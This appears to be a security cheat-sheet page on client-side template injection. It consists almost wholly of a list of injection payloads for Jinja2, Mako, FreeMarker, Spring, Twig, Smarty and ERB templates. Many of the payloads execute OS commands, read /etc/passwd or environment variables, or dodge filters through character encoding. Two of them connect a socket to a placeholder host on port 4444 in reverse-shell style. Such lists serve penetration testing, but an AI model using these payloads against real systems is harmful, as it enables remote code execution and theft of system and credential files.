# Client Side Template Injection (CSTI)

[![My Shop](https://img.shields.io/badge/My%20Shop-verylazytech-%23FFDD00?style=flat&logo=buy-me-a-coffee&logoColor=yellow)](https://buymeacoffee.com/verylazytech/extras)
[![Medium](https://img.shields.io/badge/Medium-%40verylazytech-%231572B6?style=flat&logo=medium&logoColor=white)](https://medium.com/@verylazytech)
[![Github](https://img.shields.io/badge/Github-verylazytech-%23181717?style=flat&logo=github&logoColor=white)](https://github.com/verylazytech)
[![Buy Me A Coffee](https://img.shields.io/badge/Buy%20Me%20A%20Coffee-verylazytech-%23FFDD00?style=flat&logo=buy-me-a-coffee&logoColor=yellow)](https://buymeacoffee.com/verylazytech)
[![My GitBook](https://img.shields.io/badge/My%20GitBook-VeryLazyTech-%23FFDD00?style=flat&logo=gitbook&logoColor=white)](https://www.verylazytech.com)
[![X](https://img.shields.io/twitter/url?url=https%3A%2F%2Fx.com%2Fverylazytech)](https://x.com/verylazytech)

```
#{ 3 * 3 }
#{ 7 * 7 }
#{3*3}
#{42*42}
#{7*7}
${"freemarker.template.utility.Execute"?new()("id")}
${3*3}
${42*42}
${6*6}
${7*7}
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
${T(java.lang.System).getenv()}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}${self.module.cache.util.os.system("id")}
${donotexists|42*42}
${self.__init__.__globals__['util'].os.system('id')}
${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.util.os.system("id")}
${self.attr._NSAttr__parent.template.module.cache.util.os.system("id")}
${self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")}
${self.context._with_template._mmarker.module.cache.util.os.system("id")}
${self.context._with_template._mmarker.module.runtime.util.os.system("id")}
${self.context._with_template.module.cache.compat.inspect.os.system("id")}
${self.context._with_template.module.cache.util.os.system("id")}
${self.context._with_template.module.filters.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
${self.context._with_template.module.runtime.util.os.system("id")}
${self.module.cache.compat.inspect.linecache.os.system("id")}
${self.module.cache.compat.inspect.os.system("id")}
${self.module.cache.util.compat.inspect.linecache.os.system("id")}
${self.module.cache.util.compat.inspect.os.system("id")}
${self.module.filters.compat.inspect.linecache.os.system("id")}
${self.module.filters.compat.inspect.os.system("id")}
${self.module.runtime.compat.inspect.linecache.os.system("id")}
${self.module.runtime.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.traceback.linecache.os.system("id")}
${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.util.os.system("id")}
${self.module.runtime.util.compat.inspect.linecache.os.system("id")}
${self.module.runtime.util.compat.inspect.os.system("id")}
${self.module.runtime.util.os.system("id")}
${self.template.__init__.__globals__['os'].system('id')}
${self.template._mmarker.module.cache.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.util.os.system("id")}
${self.template._mmarker.module.filters.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}
${self.template._mmarker.module.runtime.util.os.system("id")}
${self.template.module.cache.compat.inspect.linecache.os.system("id")}
${self.template.module.cache.compat.inspect.os.system("id")}
${self.template.module.cache.util.compat.inspect.os.system("id")}
${self.template.module.cache.util.os.system("id")}
${self.template.module.filters.compat.inspect.linecache.os.system("id")}
${self.template.module.filters.compat.inspect.os.system("id")}
${self.template.module.runtime.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.compat.inspect.os.system("id")}
${self.template.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
${self.template.module.runtime.exceptions.util.os.system("id")}
${self.template.module.runtime.util.compat.inspect.os.system("id")}
${self.template.module.runtime.util.os.system("id")}
${{3*3}}
${{7*7}}
${{<%[%'"}}%\
*{7*7}
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
42*42
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
<%= 3 * 3 %>
<%= 7 * 7 %>
<%= 7*7 %>
<%= File.open('/etc/passwd').read %>
<%=42*42 %>
@(1+2)
@(6+5)
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
[7*7]
[[${42*42}]]
{$smarty.version}
{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"/etc/passwd\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{42*42}
{^xyzm42}1764{/xyzm42}
{php}echo `id`;{/php}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ [].class.base.subclasses() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
{{ request }}
{{''.__class__.__base__.__subclasses__()[227]('cat /etc/passwd', shell=True, stdout=-1).communicate()}}
{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{''.class.mro()[1].subclasses()}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
{{'a'.toUpperCase()}}
{{2*2}}[[3*3]]
{{3*'3'}}
{{3*3}}
{{4*4}}[[5*5]]
{{42*42}}
{{7*'7'}}
{{7*7}}
{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}${{<%[%'"}}%\
{{=42*42}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['id']|filter('system')}}
{{app.request.query.filter(0,0,1024,{'options':'system'})}}
{{app.request.server.all|join(',')}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
{{config.items()}}
{{cycler.__init__.__globals__.os}}
{{dump(app)}}
{{joiner.__init__.__globals__.os}}
{{namespace.__init__.__globals__.os}}
{{request.__class__}}
{{request|attr("__class__")}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{self._TemplateReference__context.cycler.__init__.__globals__.os}}
{{self._TemplateReference__context.joiner.__init__.__globals__.os}}
{{self._TemplateReference__context.namespace.__init__.__globals__.os}}
{{self}}
{{{42*42}}}
```
